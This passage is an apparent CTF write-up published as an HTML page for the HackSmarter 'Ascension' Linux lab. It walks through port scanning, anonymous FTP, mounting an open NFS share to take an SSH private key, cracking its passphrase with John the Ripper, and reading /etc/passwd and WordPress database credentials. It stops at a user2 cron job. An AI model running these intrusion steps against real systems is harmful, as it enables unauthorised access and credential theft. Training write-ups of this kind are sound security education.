@@ -1,0 +1,413 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>LumiryX - Ascension</title>
+<link rel="stylesheet" href="/style/main.css">
+</head>
+
+<body>
+<header>
+<div class="favicon">
+    <a href="/index.html"><img src="/img/favicon.ico" alt="Imagine" target="_blank"></a>
+</div>
+<h1 class="page-title">LumiryX - Ascension</h1>
+<div class="header-controls">
+<button onclick="toggleTheme()">🌙</button>
+</div>
+</header>
+<div class="layout">
+
+
+<aside class="sidebar-left" id="sidebar"></aside>
+
+<!-- MAIN CONTENT -->
+<main class="main-content">
+
+<p>This CTF challenge is from <a href="https://www.hacksmarter.org" target="_blank">HackSmarter Webpage</a></p>
+<h1 id="mission-scenario">Mission Scenario</h1>
+<p>This is the Capstone Challenge for Ryan&#39;s <a href="https://academy.simplycyber.io/l/pdp/linux-hacking" target="_blank">Hacking Linux course on Simply Cyber Academy</a>. As a result, this lab isn&#39;t strictly focused on realism, but rather teaching proper enumeration, lateral movement, and privilege escalation on a Linux machine.</p>
+<p>There are 6 flags on the machine (you can see the location of each by clicking the &#39;hint&#39; button to make it less of a rabbit chase). There are also multiple ways to solve the machine... so if you solve it in one way, you can go back and see if you can find the 2nd way.</p>
+<p>Happy hacking!</p>
+<h2 id="have-to-obtain-">Have to Obtain:</h2>
+<ul>
+<li>Flag 1</li>
+<li>Flag 2</li>
+<li>Flag 3</li>
+<li>Flag 4</li>
+<li>Flag 5</li>
+<li>Flag 6</li>
+</ul>
+<h1 id="setup-">Setup:</h1>
+<p>You can connect to this lab by downloading the VPN under the &quot;Systems&quot; tab or using the Browser-Based Kali Virtual Machine.</p>
+<p>Then start a VPN with <code>openvpn</code> command:</p>
+<pre><code>~<span class="hljs-regexp">/Documents/</span>HSMvpn &gt; sudo openvpn challenge_lab_ascens.ovpn
+</code></pre><p>Add Target IP to the <code>/etc/hosts</code></p>
+<pre><code>10<span class="hljs-selector-class">.0</span><span class="hljs-selector-class">.19</span><span class="hljs-selector-class">.75</span>     <span class="hljs-selector-tag">ascension</span><span class="hljs-selector-class">.hsm</span>
+</code></pre><h1 id="enumeration">Enumeration</h1>
+<h2 id="nmap">Nmap</h2>
+<p>TCP</p>
+<pre><code>&gt; <span class="hljs-selector-tag">sudo</span> <span class="hljs-selector-tag">nmap</span> <span class="hljs-selector-tag">-sC</span> <span class="hljs-selector-tag">-sV</span> <span class="hljs-selector-tag">-p-</span> <span class="hljs-selector-tag">ascension</span><span class="hljs-selector-class">.hsm</span> <span class="hljs-selector-tag">-T5</span>
+
+<span class="hljs-selector-tag">PORT</span>      <span class="hljs-selector-tag">STATE</span> <span class="hljs-selector-tag">SERVICE</span>  <span class="hljs-selector-tag">VERSION</span>
+<span class="hljs-selector-tag">21</span>/<span class="hljs-selector-tag">tcp</span>    <span class="hljs-selector-tag">open</span>  <span class="hljs-selector-tag">ftp</span>      <span class="hljs-selector-tag">vsftpd</span> <span class="hljs-selector-tag">3</span><span class="hljs-selector-class">.0</span><span class="hljs-selector-class">.5</span>
+| <span class="hljs-selector-tag">ftp-anon</span>: <span class="hljs-selector-tag">Anonymous</span> <span class="hljs-selector-tag">FTP</span> <span class="hljs-selector-tag">login</span> <span class="hljs-selector-tag">allowed</span> (FTP code <span class="hljs-number">230</span>)
+|<span class="hljs-selector-tag">_-rw-r--r--</span>    <span class="hljs-selector-tag">1</span> <span class="hljs-selector-tag">0</span>        <span class="hljs-selector-tag">0</span>             <span class="hljs-selector-tag">202</span> <span class="hljs-selector-tag">Sep</span> <span class="hljs-selector-tag">21</span>  <span class="hljs-selector-tag">2025</span> <span class="hljs-selector-tag">pwlist</span><span class="hljs-selector-class">.txt</span>
+| <span class="hljs-selector-tag">ftp-syst</span>: 
+|   <span class="hljs-selector-tag">STAT</span>: 
+| <span class="hljs-selector-tag">FTP</span> <span class="hljs-selector-tag">server</span> <span class="hljs-selector-tag">status</span>:
+|      <span class="hljs-selector-tag">Connected</span> <span class="hljs-selector-tag">to</span> <span class="hljs-selector-tag">10</span><span class="hljs-selector-class">.0</span><span class="hljs-selector-class">.0</span><span class="hljs-selector-class">.247</span>
+|      <span class="hljs-selector-tag">Logged</span> <span class="hljs-selector-tag">in</span> <span class="hljs-selector-tag">as</span> <span class="hljs-selector-tag">ftp</span>
+|      <span class="hljs-selector-tag">TYPE</span>: <span class="hljs-selector-tag">ASCII</span>
+|      <span class="hljs-selector-tag">No</span> <span class="hljs-selector-tag">session</span> <span class="hljs-selector-tag">bandwidth</span> <span class="hljs-selector-tag">limit</span>
+|      <span class="hljs-selector-tag">Session</span> <span class="hljs-selector-tag">timeout</span> <span class="hljs-selector-tag">in</span> <span class="hljs-selector-tag">seconds</span> <span class="hljs-selector-tag">is</span> <span class="hljs-selector-tag">300</span>
+|      <span class="hljs-selector-tag">Control</span> <span class="hljs-selector-tag">connection</span> <span class="hljs-selector-tag">is</span> <span class="hljs-selector-tag">plain</span> <span class="hljs-selector-tag">text</span>
+|      <span class="hljs-selector-tag">Data</span> <span class="hljs-selector-tag">connections</span> <span class="hljs-selector-tag">will</span> <span class="hljs-selector-tag">be</span> <span class="hljs-selector-tag">plain</span> <span class="hljs-selector-tag">text</span>
+|      <span class="hljs-selector-tag">At</span> <span class="hljs-selector-tag">session</span> <span class="hljs-selector-tag">startup</span>, <span class="hljs-selector-tag">client</span> <span class="hljs-selector-tag">count</span> <span class="hljs-selector-tag">was</span> <span class="hljs-selector-tag">1</span>
+|      <span class="hljs-selector-tag">vsFTPd</span> <span class="hljs-selector-tag">3</span><span class="hljs-selector-class">.0</span><span class="hljs-selector-class">.5</span> <span class="hljs-selector-tag">-</span> <span class="hljs-selector-tag">secure</span>, <span class="hljs-selector-tag">fast</span>, <span class="hljs-selector-tag">stable</span>
+|<span class="hljs-selector-tag">_End</span> <span class="hljs-selector-tag">of</span> <span class="hljs-selector-tag">status</span>
+<span class="hljs-selector-tag">22</span>/<span class="hljs-selector-tag">tcp</span>    <span class="hljs-selector-tag">open</span>  <span class="hljs-selector-tag">ssh</span>      <span class="hljs-selector-tag">OpenSSH</span> <span class="hljs-selector-tag">9</span><span class="hljs-selector-class">.6p1</span> <span class="hljs-selector-tag">Ubuntu</span> <span class="hljs-selector-tag">3ubuntu13</span><span class="hljs-selector-class">.14</span> (Ubuntu Linux; protocol <span class="hljs-number">2.0</span>)
+| <span class="hljs-selector-tag">ssh-hostkey</span>: 
+|   <span class="hljs-selector-tag">256</span> <span class="hljs-selector-tag">03</span><span class="hljs-selector-pseudo">:5f</span><span class="hljs-selector-pseudo">:c4</span><span class="hljs-selector-pseudo">:1b</span><span class="hljs-selector-pseudo">:c1</span><span class="hljs-selector-pseudo">:88</span><span class="hljs-selector-pseudo">:bd</span><span class="hljs-selector-pseudo">:44</span><span class="hljs-selector-pseudo">:17</span><span class="hljs-selector-pseudo">:28</span><span class="hljs-selector-pseudo">:de</span><span class="hljs-selector-pseudo">:9e</span><span class="hljs-selector-pseudo">:eb</span><span class="hljs-selector-pseudo">:f3</span><span class="hljs-selector-pseudo">:9a</span><span class="hljs-selector-pseudo">:7a</span> (ECDSA)
+|<span class="hljs-selector-tag">_</span>  <span class="hljs-selector-tag">256</span> <span class="hljs-selector-tag">eb</span><span class="hljs-selector-pseudo">:87</span><span class="hljs-selector-pseudo">:0f</span><span class="hljs-selector-pseudo">:41</span><span class="hljs-selector-pseudo">:e1</span><span class="hljs-selector-pseudo">:ef</span><span class="hljs-selector-pseudo">:a5</span><span class="hljs-selector-pseudo">:d8</span><span class="hljs-selector-pseudo">:82</span><span class="hljs-selector-pseudo">:ec</span><span class="hljs-selector-pseudo">:15</span><span class="hljs-selector-pseudo">:12</span><span class="hljs-selector-pseudo">:02</span><span class="hljs-selector-pseudo">:68</span><span class="hljs-selector-pseudo">:fb</span><span class="hljs-selector-pseudo">:ca</span> (ED25519)
+<span class="hljs-selector-tag">80</span>/<span class="hljs-selector-tag">tcp</span>    <span class="hljs-selector-tag">open</span>  <span class="hljs-selector-tag">http</span>     <span class="hljs-selector-tag">Apache</span> <span class="hljs-selector-tag">httpd</span> <span class="hljs-selector-tag">2</span><span class="hljs-selector-class">.4</span><span class="hljs-selector-class">.58</span> ((Ubuntu))
+|<span class="hljs-selector-tag">_http-server-header</span>: <span class="hljs-selector-tag">Apache</span>/<span class="hljs-selector-tag">2</span><span class="hljs-selector-class">.4</span><span class="hljs-selector-class">.58</span> (Ubuntu)
+|<span class="hljs-selector-tag">_http-title</span>: <span class="hljs-selector-tag">Apache2</span> <span class="hljs-selector-tag">Ubuntu</span> <span class="hljs-selector-tag">Default</span> <span class="hljs-selector-tag">Page</span>: <span class="hljs-selector-tag">It</span> <span class="hljs-selector-tag">works</span>
+<span class="hljs-selector-tag">111</span>/<span class="hljs-selector-tag">tcp</span>   <span class="hljs-selector-tag">open</span>  <span class="hljs-selector-tag">rpcbind</span>  <span class="hljs-selector-tag">2-4</span> (RPC <span class="hljs-number">#100000</span>)
+| <span class="hljs-selector-tag">rpcinfo</span>: 
+|   <span class="hljs-selector-tag">program</span> <span class="hljs-selector-tag">version</span>    <span class="hljs-selector-tag">port</span>/<span class="hljs-selector-tag">proto</span>  <span class="hljs-selector-tag">service</span>
+|   <span class="hljs-selector-tag">100000</span>  <span class="hljs-selector-tag">2</span>,<span class="hljs-selector-tag">3</span>,<span class="hljs-selector-tag">4</span>        <span class="hljs-selector-tag">111</span>/<span class="hljs-selector-tag">tcp</span>   <span class="hljs-selector-tag">rpcbind</span>
+|   <span class="hljs-selector-tag">100000</span>  <span class="hljs-selector-tag">2</span>,<span class="hljs-selector-tag">3</span>,<span class="hljs-selector-tag">4</span>        <span class="hljs-selector-tag">111</span>/<span class="hljs-selector-tag">udp</span>   <span class="hljs-selector-tag">rpcbind</span>
+|   <span class="hljs-selector-tag">100000</span>  <span class="hljs-selector-tag">3</span>,<span class="hljs-selector-tag">4</span>          <span class="hljs-selector-tag">111</span>/<span class="hljs-selector-tag">tcp6</span>  <span class="hljs-selector-tag">rpcbind</span>
+|   <span class="hljs-selector-tag">100000</span>  <span class="hljs-selector-tag">3</span>,<span class="hljs-selector-tag">4</span>          <span class="hljs-selector-tag">111</span>/<span class="hljs-selector-tag">udp6</span>  <span class="hljs-selector-tag">rpcbind</span>
+|   <span class="hljs-selector-tag">100003</span>  <span class="hljs-selector-tag">3</span>,<span class="hljs-selector-tag">4</span>         <span class="hljs-selector-tag">2049</span>/<span class="hljs-selector-tag">tcp</span>   <span class="hljs-selector-tag">nfs</span>
+|   <span class="hljs-selector-tag">100003</span>  <span class="hljs-selector-tag">3</span>,<span class="hljs-selector-tag">4</span>         <span class="hljs-selector-tag">2049</span>/<span class="hljs-selector-tag">tcp6</span>  <span class="hljs-selector-tag">nfs</span>
+|   <span class="hljs-selector-tag">100005</span>  <span class="hljs-selector-tag">1</span>,<span class="hljs-selector-tag">2</span>,<span class="hljs-selector-tag">3</span>      <span class="hljs-selector-tag">36855</span>/<span class="hljs-selector-tag">tcp</span>   <span class="hljs-selector-tag">mountd</span>
+|   <span class="hljs-selector-tag">100005</span>  <span class="hljs-selector-tag">1</span>,<span class="hljs-selector-tag">2</span>,<span class="hljs-selector-tag">3</span>      <span class="hljs-selector-tag">38106</span>/<span class="hljs-selector-tag">udp6</span>  <span class="hljs-selector-tag">mountd</span>
+|   <span class="hljs-selector-tag">100005</span>  <span class="hljs-selector-tag">1</span>,<span class="hljs-selector-tag">2</span>,<span class="hljs-selector-tag">3</span>      <span class="hljs-selector-tag">42095</span>/<span class="hljs-selector-tag">udp</span>   <span class="hljs-selector-tag">mountd</span>
+|   <span class="hljs-selector-tag">100005</span>  <span class="hljs-selector-tag">1</span>,<span class="hljs-selector-tag">2</span>,<span class="hljs-selector-tag">3</span>      <span class="hljs-selector-tag">44789</span>/<span class="hljs-selector-tag">tcp6</span>  <span class="hljs-selector-tag">mountd</span>
+|   <span class="hljs-selector-tag">100021</span>  <span class="hljs-selector-tag">1</span>,<span class="hljs-selector-tag">3</span>,<span class="hljs-selector-tag">4</span>      <span class="hljs-selector-tag">34065</span>/<span class="hljs-selector-tag">tcp</span>   <span class="hljs-selector-tag">nlockmgr</span>                                         
+|   <span class="hljs-selector-tag">100021</span>  <span class="hljs-selector-tag">1</span>,<span class="hljs-selector-tag">3</span>,<span class="hljs-selector-tag">4</span>      <span class="hljs-selector-tag">34389</span>/<span class="hljs-selector-tag">tcp6</span>  <span class="hljs-selector-tag">nlockmgr</span>                                         
+|   <span class="hljs-selector-tag">100021</span>  <span class="hljs-selector-tag">1</span>,<span class="hljs-selector-tag">3</span>,<span class="hljs-selector-tag">4</span>      <span class="hljs-selector-tag">42276</span>/<span class="hljs-selector-tag">udp6</span>  <span class="hljs-selector-tag">nlockmgr</span>                                         
+|   <span class="hljs-selector-tag">100021</span>  <span class="hljs-selector-tag">1</span>,<span class="hljs-selector-tag">3</span>,<span class="hljs-selector-tag">4</span>      <span class="hljs-selector-tag">43673</span>/<span class="hljs-selector-tag">udp</span>   <span class="hljs-selector-tag">nlockmgr</span>
+|   <span class="hljs-selector-tag">100024</span>  <span class="hljs-selector-tag">1</span>          <span class="hljs-selector-tag">33561</span>/<span class="hljs-selector-tag">tcp6</span>  <span class="hljs-selector-tag">status</span>
+|   <span class="hljs-selector-tag">100024</span>  <span class="hljs-selector-tag">1</span>          <span class="hljs-selector-tag">47521</span>/<span class="hljs-selector-tag">tcp</span>   <span class="hljs-selector-tag">status</span>
+|   <span class="hljs-selector-tag">100024</span>  <span class="hljs-selector-tag">1</span>          <span class="hljs-selector-tag">49868</span>/<span class="hljs-selector-tag">udp</span>   <span class="hljs-selector-tag">status</span>
+|   <span class="hljs-selector-tag">100024</span>  <span class="hljs-selector-tag">1</span>          <span class="hljs-selector-tag">52552</span>/<span class="hljs-selector-tag">udp6</span>  <span class="hljs-selector-tag">status</span>
+|   <span class="hljs-selector-tag">100227</span>  <span class="hljs-selector-tag">3</span>           <span class="hljs-selector-tag">2049</span>/<span class="hljs-selector-tag">tcp</span>   <span class="hljs-selector-tag">nfs_acl</span>
+|<span class="hljs-selector-tag">_</span>  <span class="hljs-selector-tag">100227</span>  <span class="hljs-selector-tag">3</span>           <span class="hljs-selector-tag">2049</span>/<span class="hljs-selector-tag">tcp6</span>  <span class="hljs-selector-tag">nfs_acl</span>
+<span class="hljs-selector-tag">2049</span>/<span class="hljs-selector-tag">tcp</span>  <span class="hljs-selector-tag">open</span>  <span class="hljs-selector-tag">nfs_acl</span>  <span class="hljs-selector-tag">3</span> (RPC <span class="hljs-number">#100227</span>)
+<span class="hljs-selector-tag">34065</span>/<span class="hljs-selector-tag">tcp</span> <span class="hljs-selector-tag">open</span>  <span class="hljs-selector-tag">nlockmgr</span> <span class="hljs-selector-tag">1-4</span> (RPC <span class="hljs-number">#100021</span>)
+<span class="hljs-selector-tag">36855</span>/<span class="hljs-selector-tag">tcp</span> <span class="hljs-selector-tag">open</span>  <span class="hljs-selector-tag">mountd</span>   <span class="hljs-selector-tag">1-3</span> (RPC <span class="hljs-number">#100005</span>)
+<span class="hljs-selector-tag">38689</span>/<span class="hljs-selector-tag">tcp</span> <span class="hljs-selector-tag">open</span>  <span class="hljs-selector-tag">mountd</span>   <span class="hljs-selector-tag">1-3</span> (RPC <span class="hljs-number">#100005</span>)
+<span class="hljs-selector-tag">47521</span>/<span class="hljs-selector-tag">tcp</span> <span class="hljs-selector-tag">open</span>  <span class="hljs-selector-tag">status</span>   <span class="hljs-selector-tag">1</span> (RPC <span class="hljs-number">#100024</span>)
+<span class="hljs-selector-tag">55737</span>/<span class="hljs-selector-tag">tcp</span> <span class="hljs-selector-tag">open</span>  <span class="hljs-selector-tag">mountd</span>   <span class="hljs-selector-tag">1-3</span> (RPC <span class="hljs-number">#100005</span>)
+<span class="hljs-selector-tag">Service</span> <span class="hljs-selector-tag">Info</span>: <span class="hljs-selector-tag">OSs</span>: <span class="hljs-selector-tag">Unix</span>, <span class="hljs-selector-tag">Linux</span>; <span class="hljs-attribute">CPE</span>: <span class="hljs-attribute">cpe</span>:/<span class="hljs-attribute">o</span>:<span class="hljs-attribute">linux</span>:linux_kernel
+</code></pre><p>TCP Ports open:</p>
+<ul>
+<li>FTP(21) - anonymous log-in</li>
+<li>SSH(22)</li>
+<li>HTTP(80) - Apache httpd 2.4.58</li>
+<li>RPCbind/NFS-Shares(111) </li>
+<li>nfs_acl(2049)</li>
+<li>nlockmgr(34065)</li>
+<li>mountd(36855) &amp; (38689) &amp; (55737)</li>
+<li>status(47521)</li>
+</ul>
+<p>UDP</p>
+<pre><code>&gt; sudo nmap -sU -sV --top-ports <span class="hljs-number">100</span> ascension.hsm -T5
+
+PORT      STATE  SERVICE      VERSION
+<span class="hljs-number">88</span>/udp    closed kerberos-sec
+<span class="hljs-number">111</span>/udp   open   rpcbind      <span class="hljs-number">2</span><span class="hljs-number">-4</span> (RPC #<span class="hljs-number">100000</span>)
+<span class="hljs-number">161</span>/udp   closed snmp
+<span class="hljs-number">177</span>/udp   closed xdmcp
+<span class="hljs-number">427</span>/udp   closed svrloc
+<span class="hljs-number">500</span>/udp   closed isakmp
+<span class="hljs-number">520</span>/udp   closed route
+<span class="hljs-number">631</span>/udp   closed ipp
+<span class="hljs-number">32769</span>/udp closed filenet-rpc
+<span class="hljs-number">32815</span>/udp closed unknown
+<span class="hljs-number">49156</span>/udp closed unknown
+<span class="hljs-number">49186</span>/udp closed unknown
+<span class="hljs-number">49193</span>/udp closed unknown
+</code></pre><p>UDP Ports open top 100:</p>
+<ul>
+<li>RPCbind (111)</li>
+</ul>
+<h2 id="ftp-21-">FTP(21)</h2>
+<p>Since anonymous login is allowed, it is worth checking for low-hanging fruit</p>
+<pre><code>&gt; ftp anonymous@ascension.hsm
+Connected to ascension.hsm.
+220 (vsFTPd 3.0.5)
+331 Please specify the password.
+Password: 
+230 Login successful.
+Remote system type is UNIX.
+Using binary mode to transfer files.
+ftp&gt; ls -la
+229 Entering Extended Passive Mode (|||8469|)
+150 Here comes the directory listing.
+drwxr-xr-x   <span class="hljs-number"> 2 </span>0       <span class="hljs-number"> 0 </span>          <span class="hljs-number"> 4096 </span>Sep<span class="hljs-number"> 21 </span><span class="hljs-number"> 2025 </span>.
+drwxr-xr-x   <span class="hljs-number"> 2 </span>0       <span class="hljs-number"> 0 </span>          <span class="hljs-number"> 4096 </span>Sep<span class="hljs-number"> 21 </span><span class="hljs-number"> 2025 </span>..
+-rw-r--r--   <span class="hljs-number"> 1 </span>0       <span class="hljs-number"> 0 </span>           <span class="hljs-number"> 202 </span>Sep<span class="hljs-number"> 21 </span><span class="hljs-number"> 2025 </span>pwlist.txt
+ftp&gt; get pwlist.txt
+</code></pre><p>Inside the directory, we find a file named pwlist.txt, which appears to contain possible passwords that may be useful later.</p>
+<h2 id="ssh-22-">SSH(22)</h2>
+<pre><code>&gt; ssh root@ascension<span class="hljs-selector-class">.hsm</span>
+root@ascension<span class="hljs-selector-class">.hsm</span>: Permission denied (publickey).
+</code></pre><p>SSH is securely configured and only allows public key authentication, so password brute forcing is not possible.</p>
+<h2 id="http-80-">HTTP(80)</h2>
+<p>One of the first things to check is the web server version, since known vulnerabilities may exist.</p>
+<p>Apache httpd 2.4.58</p>
+<div class="screenshot"><img src="/content/Writeups/HackSmarter/img/Ascension/Apache Vulnerability.jpg"></div>
+<p>Not sure if we will be able to use SSRF vulnerability but it is worth to put it into our notes.</p>
+<h3 id="user-view">User-View</h3>
+<p>After opening the site we get a default Apache page.</p>
+<p>Have to check if it contains some more directories. Or virtual host.</p>
+<h3 id="dirsearch">DirSearch</h3>
+<pre><code>&gt; dirsearch -w /usr/share/wordlists/dirb/big.txt -u http:<span class="hljs-comment">//ascension.hsm</span>
+
+[<span class="hljs-number">17</span>:<span class="hljs-number">47</span>:<span class="hljs-number">30</span>] <span class="hljs-number">403</span> -  <span class="hljs-number">278</span>B  - /server-status                                    
+[<span class="hljs-number">17</span>:<span class="hljs-number">47</span>:<span class="hljs-number">49</span>] <span class="hljs-number">301</span> -  <span class="hljs-number">317</span>B  - /<span class="hljs-function"><span class="hljs-title">wp</span>-admin  -&gt;</span>  http:<span class="hljs-comment">//ascension.hsm/wp-admin/     </span>
+[<span class="hljs-number">17</span>:<span class="hljs-number">47</span>:<span class="hljs-number">49</span>] <span class="hljs-number">301</span> -  <span class="hljs-number">319</span>B  - /<span class="hljs-function"><span class="hljs-title">wp</span>-content  -&gt;</span>  http:<span class="hljs-comment">//ascension.hsm/wp-content/ </span>
+[<span class="hljs-number">17</span>:<span class="hljs-number">47</span>:<span class="hljs-number">49</span>] <span class="hljs-number">301</span> -  <span class="hljs-number">320</span>B  - /<span class="hljs-function"><span class="hljs-title">wp</span>-includes  -&gt;</span>  http:<span class="hljs-comment">//ascension.hsm/wp-includes/</span>
+</code></pre><ul>
+<li>wp-admin -&gt; Do not works</li>
+<li>wp-content -&gt; Do not works</li>
+<li>wp-includes -&gt; Worth to check there is bunch of data</li>
+</ul>
+<p>Using pwlist.txt as a wordlist did not reveal additional directories.</p>
+<pre><code>&gt; dirsearch -w pwlist<span class="hljs-selector-class">.txt</span> -u http:<span class="hljs-comment">//ascension.hsm</span>
+
+Nothing
+</code></pre><h3 id="ffuf">FFUF</h3>
+<pre><code>&gt; ffuf -w <span class="hljs-regexp">/usr/</span>share<span class="hljs-regexp">/wordlists/</span>dirb<span class="hljs-regexp">/big.txt -u http:/</span>/ascension.hsm -H <span class="hljs-string">"Host:FUZZ.ascension.hsm"</span> -fw <span class="hljs-number">3496</span>
+
+Nothing
+</code></pre><p><code>pwlist.txt</code> - Nothing</p>
+<h3 id="hxxp-ascnesion-hsm-wp-includes">hxxp[://]ascnesion[.]hsm/wp-includes</h3>
+<div class="screenshot"><img src="/content/Writeups/HackSmarter/img/Ascension/wp-includes first.png"></div>
+<p>/wp-includes also suggest the website is running wordpress:
+<div class="screenshot"><img src="/content/Writeups/HackSmarter/img/Ascension/wp-includes second.png"></div>
+</p>
+<p>But after running the <code>wpscan</code></p>
+<pre><code>Scan Aborted: The remote website <span class="hljs-keyword">is</span> up, <span class="hljs-keyword">but</span> <span class="hljs-keyword">does</span> <span class="hljs-keyword">not</span> seem <span class="hljs-keyword">to</span> be <span class="hljs-built_in">running</span> WordPress.
+</code></pre><p>Although /wp-includes suggests WordPress, wpscan confirms that WordPress is not fully running.</p>
+<p>Nothing critical was discovered here, but the directory should likely not be publicly accessible.</p>
+<h2 id="rpcbind-nfs-shares-111-">RPCBIND/NFS-Shares (111)</h2>
+<p>These is mountable share.</p>
+<p>First we have to check which directory is mountable. This signals it is mountable for every everyone <code>*</code></p>
+<pre><code>&gt; showmount -e ascension<span class="hljs-selector-class">.hsm</span>
+Export list <span class="hljs-keyword">for</span> ascension<span class="hljs-selector-class">.hsm</span>:
+/srv/nfs/user1 *
+</code></pre><pre><code>&gt; sudo mkdir <span class="hljs-regexp">/mnt/</span>ascension
+[sudo] password <span class="hljs-keyword">for</span> <span class="hljs-string">sh13ld:</span> 
+&gt; sudo mount -t nfs -o vers=<span class="hljs-number">3</span> ascension.<span class="hljs-string">hsm:</span><span class="hljs-regexp">/srv/</span>nfs<span class="hljs-regexp">/user1 /</span>mnt/ascension -o nolock
+
+&gt; cd <span class="hljs-regexp">/mnt/</span>ascension
+
+&gt; ls
+id_rsa  id_rsa.pub
+</code></pre><p>Now we have to copy the files from it.</p>
+<pre><code>&gt; cp id_rsa* <span class="hljs-regexp">/home/</span>sh13ld<span class="hljs-regexp">/Documents/</span>HackSmarter<span class="hljs-regexp">/ascension</span>
+</code></pre><p>Now we have keys and should be able to log-in via SSH.</p>
+<h1 id="exploitation">Exploitation</h1>
+<p>We will use SSH keys which we obtain earlier in the Enumeration phase to log in as user1.</p>
+<p>But firstly we have to set-up permissions for <code>id_rsa</code> to be able use it:</p>
+<pre><code>&gt; chmod <span class="hljs-number">600</span> id_rsa
+&gt; ssh user1@ascension<span class="hljs-selector-class">.hsm</span> -<span class="hljs-selector-tag">i</span> id_rsa
+Enter passphrase <span class="hljs-keyword">for</span> key <span class="hljs-string">'id_rsa'</span>:
+</code></pre><p>After that you can see the id_rsa key is protected with the passphrase. For this purpose I gonna use John the Ripper.</p>
+<h3 id="crack-the-passphrase-using-john-the-ripper-">Crack the passphrase using John the Ripper:</h3>
+<ol>
+<li><p>Extract the Hash: <code>ssh2john</code> to convert the private key file into a crackable hash format.</p>
+<pre><code>&gt; <span class="hljs-selector-tag">ssh2john</span> <span class="hljs-selector-tag">id_rsa</span> &gt; <span class="hljs-selector-tag">hash</span><span class="hljs-selector-class">.txt</span>
+</code></pre></li>
+<li><p>Crack the Hash: I tried <code>pwlist.txt</code> but it didnt work. So I will try <code>rockyou.txt</code> otherwise we can also use <a href="https://crackstation.net" target="_blank">https://crackstation.net</a> they have also big database of passwords.</p>
+<pre><code>&gt; sudo john -w <span class="hljs-regexp">/usr/</span>share<span class="hljs-regexp">/wordlists/</span>rockyou.txt hash.txt
+</code></pre></li>
+</ol>
+<p>We successfully cracked hash with <code>rockyou.txt</code> wordlist.</p>
+<div class="screenshot"><img src="/content/Writeups/HackSmarter/img/Ascension/User1 cracked SSH passphrase.png"></div>
+<h1 id="user1-access-initial-foothold-">User1 Access (Initial Foothold)</h1>
+<p>Now when we know a passphrase for id_rsa we can log-in via SSH to user1.
+<div class="screenshot"><img src="/content/Writeups/HackSmarter/img/Ascension/Log-in as user1.png"></div>
+</p>
+<p>User1 Flag is in the <code>/opt/user1</code> Directory.</p>
+<pre><code>user1<span class="hljs-variable">@ip</span>-<span class="hljs-number">10</span>-<span class="hljs-number">0</span>-<span class="hljs-number">19</span>-<span class="hljs-number">75</span><span class="hljs-symbol">:/opt/user1</span><span class="hljs-variable">$ </span>ls
+flag1
+user1<span class="hljs-variable">@ip</span>-<span class="hljs-number">10</span>-<span class="hljs-number">0</span>-<span class="hljs-number">19</span>-<span class="hljs-number">75</span><span class="hljs-symbol">:/opt/user1</span><span class="hljs-variable">$ </span>cat flag1
+RkxBRzF7aGpzeXU4OTIzMzRoam9obnNkO*****
+</code></pre><h1 id="lateral-movement-to-user2">Lateral Movement to User2</h1>
+<p>Users with SHELLS:</p>
+<pre><code>cat /etc/passwd 
+<span class="hljs-symbol">user1:</span><span class="hljs-symbol">x:</span><span class="hljs-number">1001</span><span class="hljs-symbol">:</span><span class="hljs-number">1001</span><span class="hljs-symbol">:</span><span class="hljs-symbol">:/home/user1</span><span class="hljs-symbol">:/bin/bash</span>
+<span class="hljs-symbol">user2:</span><span class="hljs-symbol">x:</span><span class="hljs-number">1002</span><span class="hljs-symbol">:</span><span class="hljs-number">1002</span><span class="hljs-symbol">:</span><span class="hljs-symbol">:/home/user2</span><span class="hljs-symbol">:/bin/bash</span>
+<span class="hljs-symbol">user3:</span><span class="hljs-symbol">x:</span><span class="hljs-number">1003</span><span class="hljs-symbol">:</span><span class="hljs-number">1003</span><span class="hljs-symbol">:</span><span class="hljs-symbol">:/home/user3</span><span class="hljs-symbol">:/bin/bash</span>
+<span class="hljs-symbol">ftpuser:</span><span class="hljs-symbol">x:</span><span class="hljs-number">1004</span><span class="hljs-symbol">:</span><span class="hljs-number">1004</span><span class="hljs-symbol">:</span><span class="hljs-symbol">:/home/ftpuser</span><span class="hljs-symbol">:/bin/bash</span>
+</code></pre><p>ID:</p>
+<pre><code>uid=1001(<span class="hljs-name">user1</span>) gid=1001(<span class="hljs-name">user1</span>) groups=1001(<span class="hljs-name">user1</span>)
+</code></pre><p> Wordpress database creds:</p>
+<pre><code>user1@ip-<span class="hljs-number">10</span>-<span class="hljs-number">1</span>-<span class="hljs-number">182</span>-<span class="hljs-number">113</span><span class="hljs-symbol">:/var/www/html</span>$ cat wp-config.php
+&lt;?php
+define(<span class="hljs-string">'DB_NAME'</span>, <span class="hljs-string">'wordpress'</span>);
+define(<span class="hljs-string">'DB_USER'</span>, <span class="hljs-string">'wpuser'</span>);
+define(<span class="hljs-string">'DB_PASSWORD'</span>, <span class="hljs-string">'wppass***'</span>);
+define(<span class="hljs-string">'DB_HOST'</span>, <span class="hljs-string">'localhost'</span>);
+<span class="hljs-meta">?&gt;</span>
+</code></pre><h4 id="pspy64-">PSPY64:</h4>
+<p>Also you can read more about it here: <a href="https://github.com/dominicbreuker/pspy" target="_blank">https://github.com/dominicbreuker/pspy</a>
+We was able to find some interesting path:</p>
+<pre><code>/usr/sbin/mysqld -- worth <span class="hljs-keyword">to</span> dig <span class="hljs-keyword">into</span>
+</code></pre><p>Potentially we can abuse these cronjob and move to user2. Because UID=1002 have user2, as you can saw from the ID command.</p>
+<pre><code><span class="hljs-number">2026</span><span class="hljs-regexp">/01/</span><span class="hljs-number">29</span> <span class="hljs-number">22</span>:<span class="hljs-number">56</span>:<span class="hljs-number">01</span> <span class="hljs-string">CMD:</span> UID=<span class="hljs-number">1002</span>  PID=<span class="hljs-number">1663</span>   | <span class="hljs-regexp">/bin/</span>sh -c <span class="hljs-regexp">/tmp/</span>backup.sh 
+<span class="hljs-number">2026</span><span class="hljs-regexp">/01/</span><span class="hljs-number">29</span> <span class="hljs-number">22</span>:<span class="hljs-number">56</span>:<span class="hljs-number">01</span> <span class="hljs-string">CMD:</span> UID=<span class="hljs-number">1002</span>  PID=<span class="hljs-number">1664</span>   | <span class="hljs-regexp">/bin/</span>sh -c <span class="hljs-regexp">/tmp/</span>backup.sh 
